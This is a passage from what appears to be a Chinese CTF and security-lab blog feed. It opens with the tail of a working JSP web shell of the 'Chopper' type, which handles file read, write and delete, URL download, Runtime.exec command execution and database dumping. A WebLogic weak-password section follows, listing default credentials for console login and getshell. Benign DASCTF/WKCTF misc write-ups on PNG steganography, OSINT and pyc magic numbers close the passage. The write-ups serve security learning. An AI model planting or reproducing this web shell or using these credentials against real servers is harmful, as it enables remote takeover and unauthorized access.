+ <span class="string">&quot;/\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length()+ <span class="string">&quot;\t&quot;</span> + sQ + <span class="string">&quot;\n&quot;</span>);&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sF+=l[i].getName() + <span class="string">&quot;\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length() + <span class="string">&quot;\t&quot;</span>+ sQ + <span class="string">&quot;\n&quot;</span>;&#125;&#125;</span><br><span class="line">        sb.append(sF);&#125;void EE(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);<span class="keyword">if</span> (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();<span class="keyword">for</span> (<span class="built_in">int</span> k = <span class="number">0</span>; k &lt; x.length; k++) &#123;<span class="keyword">if</span> (!x[k].delete()) &#123;EE(x[k].getPath());&#125;&#125;&#125;</span><br><span class="line">        f.delete();&#125;void FF(String s, HttpServletResponse r) throws Exception &#123;</span><br><span class="line">        <span class="built_in">int</span> n;</span><br><span class="line">        byte[] b = new byte[<span class="number">512</span>];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream <span class="keyword">is</span> = new BufferedInputStream(new FileInputStream(s));</span><br><span class="line">        os.write((<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);<span class="keyword">while</span> ((n = <span class="keyword">is</span>.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);&#125;</span><br><span class="line">        os.write((<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        os.close();<span class="keyword">is</span>.close();&#125;void GG(String s, String d) throws Exception &#123;</span><br><span class="line">        String h = <span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = new FileOutputStream(f);<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; d.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            os.write((h.indexOf(d.charAt(i)) &lt;&lt; <span class="number">4</span> | h.indexOf(d.charAt(i + <span class="number">1</span>))));&#125;</span><br><span class="line">        os.close();&#125;void HH(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);<span class="keyword">if</span> (sf.isDirectory()) &#123;<span class="keyword">if</span> (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();&#125;</span><br><span class="line">            File z[] = sf.listFiles();<span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; z.length; j++) &#123;HH(s + <span class="string">&quot;/&quot;</span> + z[j].getName(), d + <span class="string">&quot;/&quot;</span> + z[j].getName());&#125;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            FileInputStream <span class="keyword">is</span> = new FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = new FileOutputStream(df);</span><br><span class="line">            <span class="built_in">int</span> n;</span><br><span class="line">            byte[] b = new byte[<span class="number">512</span>];<span class="keyword">while</span> ((n = <span class="keyword">is</span>.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                os.write(b, <span class="number">0</span>, n);&#125;<span class="keyword">is</span>.close();</span><br><span class="line">            os.close();&#125;&#125;void II(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        sf.renameTo(df);&#125;void JJ(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.mkdir();&#125;void KK(String s, String t) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());&#125;void LL(String s, String d) throws Exception &#123;</span><br><span class="line">        URL u = new URL(s);</span><br><span class="line">        <span class="built_in">int</span> n = <span class="number">0</span>;</span><br><span class="line">        FileOutputStream os = new FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream <span class="keyword">is</span> = h.getInputStream();</span><br><span class="line">        byte[] b = new byte[<span class="number">512</span>];<span class="keyword">while</span> ((n = <span class="keyword">is</span>.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);&#125;</span><br><span class="line">        os.close();<span class="keyword">is</span>.close();</span><br><span class="line">        h.disconnect();&#125;void MM(InputStream <span class="keyword">is</span>, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(<span class="keyword">is</span>));<span class="keyword">while</span> ((l = br.readLine()) != null) &#123;</span><br><span class="line">            sb.append(l + <span class="string">&quot;\r\n&quot;</span>);&#125;&#125;void NN(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = s.indexOf(<span class="string">&quot;jdbc:oracle&quot;</span>)!=-<span class="number">1</span>?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();<span class="keyword">while</span> (r.<span class="built_in">next</span>()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="number">1</span>) + <span class="string">&quot;\t|\t\r\n&quot;</span>);&#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();&#125;void OO(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;choraheiheihei&quot;</span>);</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(null,s.indexOf(<span class="string">&quot;jdbc:oracle&quot;</span>)!=-<span class="number">1</span>?x.length&gt;<span class="number">5</span>?x[<span class="number">5</span>]:x[<span class="number">4</span>]:null, <span class="string">&quot;%&quot;</span>, new String[]&#123;<span class="string">&quot;TABLE&quot;</span>&#125;);<span class="keyword">while</span> (r.<span class="built_in">next</span>()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="string">&quot;TABLE_NAME&quot;</span>) + <span class="string">&quot;\t|\t\r\n&quot;</span>);&#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();&#125;void PP(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1007</span>);</span><br><span class="line">        ResultSet r = m.executeQuery(<span class="string">&quot;select * from &quot;</span> + x[x.length-<span class="number">1</span>]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + <span class="string">&quot; (&quot;</span> + d.getColumnTypeName(i)+ <span class="string">&quot;)\t&quot;</span>);&#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();&#125;void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1008</span>);</span><br><span class="line">        BufferedWriter bw = null;<span class="keyword">try</span> &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q.indexOf(<span class="string">&quot;--f:&quot;</span>)!=-<span class="number">1</span>?q.substring(<span class="number">0</span>,q.indexOf(<span class="string">&quot;--f:&quot;</span>)):q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            <span class="built_in">int</span> n = d.getColumnCount();<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + <span class="string">&quot;\t|\t&quot;</span>);&#125;</span><br><span class="line">            sb.append(<span class="string">&quot;\r\n&quot;</span>);<span class="keyword">if</span>(q.indexOf(<span class="string">&quot;--f:&quot;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                File file = new File(p);<span class="keyword">if</span>(q.indexOf(<span class="string">&quot;-to:&quot;</span>)==-<span class="number">1</span>)&#123;</span><br><span class="line">                    file.mkdir();&#125;</span><br><span class="line">                bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(<span class="string">&quot;-to:&quot;</span>)!=-<span class="number">1</span>?p.trim():p+q.substring(q.indexOf(<span class="string">&quot;--f:&quot;</span>) + <span class="number">4</span>,q.length()).trim()),true),cs));&#125;<span class="keyword">while</span> (r.<span class="built_in">next</span>()) &#123;<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;<span class="keyword">if</span>(q.indexOf(<span class="string">&quot;--f:&quot;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        bw.write(r.getObject(i)+<span class="string">&quot;&quot;</span>+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                        bw.flush();&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        sb.append(r.getObject(i)+<span class="string">&quot;&quot;</span> + <span class="string">&quot;\t|\t&quot;</span>);&#125;&#125;<span class="keyword">if</span>(bw!=null)&#123;bw.newLine();&#125;</span><br><span class="line">                sb.append(<span class="string">&quot;\r\n&quot;</span>);&#125;</span><br><span class="line">            r.close();<span class="keyword">if</span>(bw!=null)&#123;bw.close();&#125;&#125; catch (Exception e) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;Result\t|\t\r\n&quot;</span>);<span class="keyword">try</span> &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(<span class="string">&quot;Execute Successfully!\t|\t\r\n&quot;</span>);&#125; catch (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + <span class="string">&quot;\t|\t\r\n&quot;</span>);&#125;&#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();&#125;%&gt;&lt;%//String Z = EC(request.getParameter(Pwd) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    </span><br><span class="line">    cs = request.getParameter(<span class="string">&quot;code&quot;</span>) != null ? request.getParameter(<span class="string">&quot;code&quot;</span>)+ <span class="string">&quot;&quot;</span>:cs;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(<span class="string">&quot;text/html;charset=&quot;</span> + cs);</span><br><span class="line">    StringBuffer sb = new StringBuffer(<span class="string">&quot;&quot;</span>);<span class="keyword">if</span> (request.getParameter(Pwd) != null) &#123;<span class="keyword">try</span> &#123;</span><br><span class="line">        String Z = EC(request.getParameter(<span class="string">&quot;action&quot;</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        String z1 = EC(request.getParameter(<span class="string">&quot;z1&quot;</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        String z2 = EC(request.getParameter(<span class="string">&quot;z2&quot;</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>);</span><br><span class="line">        String s = request.getSession().getServletContext().getRealPath(<span class="string">&quot;/&quot;</span>);<span class="keyword">if</span> (Z.equals(<span class="string">&quot;A&quot;</span>)) &#123;</span><br><span class="line">            sb.append(s + <span class="string">&quot;\t&quot;</span>);<span class="keyword">if</span> (!s.substring(<span class="number">0</span>, <span class="number">1</span>).equals(<span class="string">&quot;/&quot;</span>)) &#123;AA(sb);&#125;&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;B&quot;</span>)) &#123;BB(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;C&quot;</span>)) &#123;</span><br><span class="line">            String l = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));<span class="keyword">while</span> ((l = br.readLine()) != null) &#123;</span><br><span class="line">                sb.append(l + <span class="string">&quot;\r\n&quot;</span>);&#125;</span><br><span class="line">            br.close();&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;D&quot;</span>)) &#123;</span><br><span class="line">            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;E&quot;</span>)) &#123;EE(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;F&quot;</span>)) &#123;FF(z1, response);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;G&quot;</span>)) &#123;GG(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;H&quot;</span>)) &#123;HH(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;I&quot;</span>)) &#123;II(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;J&quot;</span>)) &#123;JJ(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;K&quot;</span>)) &#123;KK(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;L&quot;</span>)) &#123;LL(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;M&quot;</span>)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(<span class="number">2</span>), z1.substring(<span class="number">0</span>, <span class="number">2</span>), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().<span class="built_in">exec</span>(c);MM(p.getInputStream(), sb);MM(p.getErrorStream(), sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;N&quot;</span>)) &#123;NN(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;O&quot;</span>)) &#123;OO(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;P&quot;</span>)) &#123;PP(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;Q&quot;</span>)) &#123;QQ(cs, z1, z2, sb,z2.indexOf(<span class="string">&quot;-to:&quot;</span>)!=-<span class="number">1</span>?z2.substring(z2.indexOf(<span class="string">&quot;-to:&quot;</span>)+<span class="number">4</span>,z2.length()):s.replaceAll(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;/&quot;</span>)+<span class="string">&quot;images/&quot;</span>);&#125;&#125; catch (Exception e) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;ERROR&quot;</span> + <span class="string">&quot;:// &quot;</span> + e.toString());&#125;</span><br><span class="line">    sb.append(<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>);</span><br><span class="line">    out.<span class="built_in">print</span>(sb.toString());&#125;%&gt;</span><br></pre></td></tr></table></figure><h3 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h3><p>漏洞详情：由于管理员的疏忽，有可能会设置一些弱口令，攻击者可以通过常见的口令猜解进入后台，再通过后台getshell</p><p>访问后台地址<a href="http://your-ip:7001/console">http://your-ip:7001/console</a></p><p>常见的weblogic的口令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system:password</span><br><span class="line">weblogic:weblogic</span><br><span class="line">admin:secruity</span><br><span class="line">joe:password</span><br><span class="line">mary:password</span><br><span class="line">system:sercurity</span><br><span class="line">wlcsystem: wlcsystem</span><br><span class="line">weblogic:Oracle@<span class="number">123</span></span><br></pre></td></tr></table></figure><p>这里通过测试：weblogic:Oracle@123，成功登录</p><p><img src="/img/1721567330384-13.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF</title>
      <link href="/2024/07/21/DASCTF/"/>
      <url>/2024/07/21/DASCTF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="png-master"><a href="#png-master" class="headerlink" title="png_master"></a>png_master</h3><p>part1：010发现文件末尾有base64</p><p><img src="/img/1721568082484-37.png" alt="img"></p><p>cyberchef解密得</p><p>flag1:DASCTF{2fd9e9ff-e27</p><p>part2：stegsolve里发现</p><p><img src="/img/1721568082484-38.png" alt="img"></p><p>flag2：d-5405-c5f5-</p><p>part3：检查一下pngIDAT块的信息</p><p>关于IDAT隐写就在此处介绍一下</p><p>IDAT有<strong>固定的长度</strong>，正常的<strong>PNG图片</strong>只有最后一个IDAT块的长度是比其他的要短的，在此处很明显的58674是最后一个IDAT模块，但是后面仍然多了一个IDAT,这是多余的，可以用binwalk检测一下，其实我们可以发现他其实是有2个zlib，有几个zlib代表有几张png图片，可以浅浅的这样理解一下</p><p>一般解题思路：将最后的一个IDAT模块解压提取出来，因为这里有出题人所隐藏的信息，看了网上一个题的解题思路是将其IDAT的数据提取出来转二进制，进行二维码绘图，扫码即可得flag，在这里就不再演示了</p><p><img src="/img/1721568082485-39.png" alt="img"></p><p>发现长度为3394的模块异常，加上原文件的头尾，CRC爆破</p><p><img src="/img/1722310466870-1.png" alt="img"></p><p>最后一段flag为a19131f86126}</p><p>DASCTF{2fd9e9ff-e27d-5405-c5f5-a19131f86126}</p>]]></content>
      
      
      <categories>
          
          <category> 比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WKCTF</title>
      <link href="/2024/07/21/WKCTF/"/>
      <url>/2024/07/21/WKCTF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><p>twinhex编码解码，得到base64编码，从格式看出是图⽚转了base64，于是⽤在线Base64转图⽚恢复图⽚，是个⼆维码，扫描得到要发送WKCTF2024到公众号获取flag。</p><h3 id="小z的社交网络"><a href="#小z的社交网络" class="headerlink" title="小z的社交网络"></a>小z的社交网络</h3><p>题目显示的是AES的ecb加密方式，这里给的是一张ppm图片，图片格式已经损坏 ，根据ElectronicColoringBook可以对其进行恢复</p><p><img src="/img/1721553107561-4.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python ElectronicColoringBook.py <span class="built_in">id</span>.ppm --blocksize=<span class="number">3</span> -p <span class="number">3</span> -o <span class="number">10</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721553107560-1.png" alt="img"></p><p>得知其账号</p><p>d3d3LnppbWFibHVlLmxpZmU&#x3D; </p><p><img src="/img/1721553107560-2.png" alt="img"></p><p>继续在微博⾥找，可以看到有微博说明了密码是⼥朋友⽣⽇，再在下⼀条可以看到他⼥朋友的⼩红书 </p><p>图⽚⽔印，根据⽔印找到其账号，然后在个⼈简介找到⼀个base58编码，解密发现是qq，访问qq可以 </p><p>看到⽣⽇20000917，那么就可以解开博客了。博客是个提⽰，提⽰要去找github账号。  </p><p><a href="https://github.com/BeBetterCoder/WKCTF%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E8%BF%99%E9%87%8C%E4%BB%96%E8%BF%9B%E8%A1%8C%E5%88%A0%E9%99%A4%E4%BA%86flag.zip">https://github.com/BeBetterCoder/WKCTF，可以发现这里他进行删除了flag.zip</a></p><p><img src="/img/1721553107560-3.png" alt="img"></p><p>4.根据博客的域名等信息去git搜索ZimaBlue可以找到其账号，有个库叫做WKCTF，在⾥⾯只有 </p><p>readme，但是在commit⾥可以看到之前删除的⽂件，找到flag.swp，通过在linux下 vim -r FLAG可恢 </p><p>复⽂件。 </p><h3 id="不套是你的谎言"><a href="#不套是你的谎言" class="headerlink" title="不套是你的谎言"></a>不套是你的谎言</h3><p>附件就一个txt文件，如果做过python逆向的话可以看出这个是pyc的magic头。每一个magic头对应相应的python小版本。因为没有别的信息，因此考虑先把每个hex转成python小版本试试看。关于py版本和magic的关系网上可以找到，reverse过程的脚本如下：</p><p>如果取每个python小版本的数字那刚好就是0-9，因此考虑这是十进制。连起来转int再转bytes可以看出是zip文件。这个zip是伪加密，因此改一下两处标志位可以正常解压。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_magic</span>(<span class="params">magic_number</span>):</span><br><span class="line">    tmp = <span class="built_in">int</span>(magic_number[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">    tmp = long_to_bytes(tmp)</span><br><span class="line">    number = <span class="built_in">int</span>.from_bytes(tmp[:<span class="number">2</span>],<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> number</span><br><span class="line"></span><br><span class="line">PYTHON_MAGIC = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3</span></span><br><span class="line">    <span class="number">3000</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3010</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3020</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3030</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3040</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3050</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3060</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3061</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3071</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3081</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3091</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3101</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3103</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3111</span>: (<span class="number">3</span>, <span class="number">0</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3131</span>: (<span class="number">3</span>, <span class="number">0</span>),  <span class="comment"># a5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.1</span></span><br><span class="line">    <span class="number">3141</span>: (<span class="number">3</span>, <span class="number">1</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3151</span>: (<span class="number">3</span>, <span class="number">1</span>),  <span class="comment"># a0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.2</span></span><br><span class="line">    <span class="number">3160</span>: (<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3170</span>: (<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3180</span>: (<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># a2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.3</span></span><br><span class="line">    <span class="number">3190</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3200</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3220</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3230</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.4</span></span><br><span class="line">    <span class="number">3250</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3260</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3270</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3280</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3290</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3300</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3310</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># rc2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.5</span></span><br><span class="line">    <span class="number">3320</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3330</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3340</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3350</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3351</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># 3.5.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.6</span></span><br><span class="line">    <span class="number">3360</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3361</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3370</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3371</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3372</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3373</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3375</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3376</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3377</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3378</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3379</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># rc1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.7</span></span><br><span class="line">    <span class="number">3390</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3391</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># a2</span></span><br><span class="line">    <span class="number">3392</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3393</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3394</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># b5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.8</span></span><br><span class="line">    <span class="number">3400</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3401</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3410</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3411</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3412</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3413</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># b4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.9</span></span><br><span class="line">    <span class="number">3420</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3421</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3422</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3423</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a2</span></span><br><span class="line">    <span class="number">3424</span>: (<span class="number">3</span>, <span 